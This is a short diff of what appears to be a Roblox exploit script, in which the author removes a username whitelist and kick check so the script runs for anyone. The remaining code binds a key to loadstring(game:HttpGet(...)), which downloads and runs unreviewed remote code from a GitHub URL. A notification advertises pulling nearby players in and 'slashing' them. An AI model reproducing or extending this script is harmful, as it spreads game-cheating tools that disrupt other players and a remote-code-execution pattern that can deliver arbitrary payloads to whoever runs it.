@@ -1,5 +1,3 @@
-list = {"zzotac"}
-if table.find(list,game.Players.LocalPlayer.Name) then
 game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(key)
 	if key == "=" then
 	   loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/skrt/main/pwall'))()
@@ -27,6 +25,3 @@ game.StarterGui:SetCore("SendNotification", {
     Text = "Press = to bring poeple near you or - to slash them. ";
     Duration = 5; 
     })
-else
-    game.Players.LocalPlayer:kick("NOOOOOOO")
-end
